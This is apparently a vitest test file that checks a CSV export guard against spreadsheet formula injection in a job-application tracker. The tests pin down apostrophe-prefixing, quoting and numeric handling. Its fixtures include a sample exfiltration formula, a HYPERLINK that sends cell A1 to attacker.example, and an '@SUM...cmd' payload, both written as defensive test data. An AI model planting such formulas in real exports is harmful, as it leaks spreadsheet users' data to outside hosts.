import { describe, it, expect } from 'vitest';
import { csvField, neutralizeFormula, toCsv } from '../lib/csv';
import { applicationsTable, csvOf } from '../careers/services/exports';
import type { ApplicationRow } from '../careers/types/jobs';

/**
 * CSV formula injection (CWE-1236).
 *
 * Quoting a cell does not make it inert: a spreadsheet strips the CSV quoting
 * first, so `"=1+1"` arrives at the formula engine as `=1+1`. Both exporters
 * escaped quotes and neither guarded against this. These tests pin the guard.
 */
describe('CSV injection guard', () => {
  for (const trigger of ['=', '+', '-', '@', '\t', '\r']) {
    it(`neutralizes a cell starting with ${JSON.stringify(trigger)}`, () => {
      expect(neutralizeFormula(`${trigger}1+1`)).toBe(`'${trigger}1+1`);
    });
  }

  it('neutralizes a trigger hidden behind leading whitespace', () => {
    // Spreadsheets tolerate the space and still evaluate what follows.
    expect(neutralizeFormula('  =1+1')).toBe("'  =1+1");
  });

  it('leaves ordinary text completely alone', () => {
    expect(neutralizeFormula('Acme, Inc.')).toBe('Acme, Inc.');
    expect(csvField('Groceries')).toBe('Groceries');
  });

  /**
   * The guard is for strings only. Guarding numbers would turn every negative
   * amount into text and break every total in the exported sheet.
   */
  it('never guards a numeric cell, so negative amounts stay numbers', () => {
    expect(csvField(-50)).toBe('-50');
    expect(csvField(0)).toBe('0');
  });

  it('still escapes quotes, commas and newlines correctly', () => {
    expect(csvField('Acme, Inc.')).toBe('"Acme, Inc."');
    expect(csvField('Analyst "Risk"')).toBe('"Analyst ""Risk"""');
    expect(csvField('line1\nline2')).toBe('"line1\nline2"');
  });

  it('guards first, then quotes — a formula containing a comma stays inert', () => {
    expect(csvField('=SUM(A1,B1)')).toBe('"\'=SUM(A1,B1)"');
  });

  it('renders empty cells for null and undefined', () => {
    expect(toCsv([[null, undefined, 'x']])).toBe(',,x');
  });
});

/**
 * The path that makes this more than a self-inflicted problem: company_name and
 * job_title are ingested from third-party job APIs, so the attacker is whoever
 * can publish a listing — not the user opening the file.
 */
describe('careers CSV export with a hostile job listing', () => {
  function app(over: Partial<ApplicationRow>): ApplicationRow {
    return {
      id: 'a1', user_id: 'u', job_id: null, company_id: null, contact_id: null,
      resume_version_id: null, cover_letter_id: null,
      company_name: 'Acme', job_title: 'Analyst', department: '', salary_text: '',
      employment_type: '', location: '', work_mode: '', visa_sponsorship: '',
      source: 'manual', job_url: '', stage: 'applied', priority: 'high', tags: [],
      notes: '', match_score: 82, ats_score: 74,
      applied_at: null, closes_at: null, interview_at: null,
      offer_expires_at: null, next_action_at: null, archived: false,
      created_at: '', updated_at: '',
      ...over,
    };
  }

  it('does not emit an executable exfiltration formula from a provider field', () => {
    const hostile = '=HYPERLINK("https://attacker.example/?d="&A1,"Salary details")';
    const csv = csvOf(applicationsTable([app({ company_name: hostile })]));

    // The payload survives as readable text — the inner quotes are doubled per
    // RFC 4180, so it is the distinctive content, not the byte sequence, that
    // must still be there — but it never survives as a live formula.
    expect(csv).toContain('attacker.example/?d=');
    expect(csv).toContain("\"'=HYPERLINK");
    // No cell begins a formula: not at line start, and not just after a comma.
    expect(csv).not.toMatch(/(^|,)=/m);
  });

  it('guards a hostile job title too', () => {
    const csv = csvOf(applicationsTable([app({ job_title: '@SUM(1+1)*cmd' })]));
    expect(csv).toContain("'@SUM(1+1)*cmd");
    expect(csv).not.toMatch(/,@SUM/);
  });
});
